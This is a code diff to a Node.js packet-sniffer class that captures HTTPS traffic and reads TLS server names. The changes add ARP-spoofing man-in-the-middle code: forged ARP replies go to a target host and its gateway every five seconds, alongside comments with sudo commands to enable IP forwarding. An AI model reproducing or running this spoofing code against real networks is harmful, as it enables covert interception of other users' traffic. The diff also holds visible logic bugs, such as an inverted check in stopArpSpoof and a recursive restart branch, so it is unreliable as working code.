@@ -3,7 +3,9 @@ const fs = require('fs')
 const pcapFilters = require('./pcap-filters')
 const tlsClientHello = require('is-tls-client-hello')
 const sni = require('sni')
-
+//sudo sysctl -w net.inet.ip.forwarding=1
+//sudo sysctl -w net.inet.ip.fw.enable=1
+//https://www.npmjs.com/package/electron-sudo
 class PcapSniffer {
 
   constructor () {
@@ -13,8 +15,7 @@ class PcapSniffer {
     this.initComplete = false;
     this._client = null
     this.arpInterval = null
-    // TODO: Make this dynamic
-    // this.mac = "60:03:08:93:6b:ba"
+    this.arpTarget = null
     try{
       this.session = pcap.createSession(this._if, pcapFilters.https)
     }
@@ -60,27 +61,56 @@ class PcapSniffer {
 
   stop (socket) {
     this.sniff = false
+    this.stopArpSpoof()
   }
 
   startArpSpoof (params) {
-    if(!this.arpInterval)
+    if(!this.arpInterval){
       this.arpInterval = setInterval(() => {
-        this.arpPack(params.toRouter)
         this.arpPack(params.toTarget)
+        this.arpPack(params.toRouter)
       }, 5000)
+    this.info(`Start arp spoof. target:${params.toRouter.src_ip}`)
+    this.arpTarget = params.toRouter.src_ip
+    }
     else{
+      this.info(`Spoof already running. clearing current spoof and restarting`)
       clearInterval(this.arpInterval)
         this.arpInterval = setInterval(() => {
         this.arpPack(params.toRouter)
         this.arpPack(params.toTarget)
         }, 5000)
+      this.arpInterval = null
+      this.arpTarget = null
+      this.startArpSpoof(params)
     }
   }
 
-  stopArpSpoof (params) {
+  stopArpSpoof () {
     if(!this.arpInterval){
+      this.info(`Stop arp spoof`)
       clearInterval(this.arpInterval)
+      this.arpInterval = null
+      this.arpTarget = null
     }
+  }
+
+  updateTarget (socket, d) {
+    let params = {}
+    params.toRouter = {
+      src_ip: d.target_ip,
+      src_mac: d.self_mac,
+      target_ip: d.gw_ip,
+      target_mac: d.gw_mac
+    }
+
+    params.toTarget = {
+      src_ip:d.gw_ip,
+      src_mac:d.self_mac,
+      target_ip:d.target_ip,
+      target_mac:d.target_mac
+    }
+    this.startArpSpoof(params)
   }
 // src ip  (the IP you're targetting )
 // src mac (your OWN mac address)
@@ -92,7 +122,7 @@ class PcapSniffer {
                     target_ip:"192.168.1.1",
                     target_mac:"6c:72:20:6b:89:44"})
   {
-    pkt_config = {
+    let pkt_config = {
             'op': 'request',
             'src_ip': config.src_ip,
             'src_mac': config.src_mac,
@@ -102,7 +132,7 @@ class PcapSniffer {
 
     let pkt = {};
     pkt.dst = this.mac_to_arr("ff:ff:ff:ff:ff:ff");
-    pkt.src = this.mac_to_arr(this.mac);
+    pkt.src = this.mac_to_arr(pkt_config.src_mac);
 
     // ARP
     pkt.ether_type = [0x08, 0x06];
@@ -112,7 +142,6 @@ class PcapSniffer {
     pkt.proto_len = [0x04];
     pkt.op = [0x00, 0x02];
 
-    pkt.src_mac = this.mac_to_arr(this.mac);
     pkt.src_mac = this.mac_to_arr(pkt_config.src_mac);
     pkt.src_ip = this.ip_to_arr(pkt_config.src_ip);
     pkt.dst_mac = this.mac_to_arr(pkt_config.dst_mac);
@@ -153,7 +182,9 @@ class PcapSniffer {
       }
       return false
     }
+    if(this.arpTarget){
 
+    }
     if(!tcp.data){
       return false;
     }
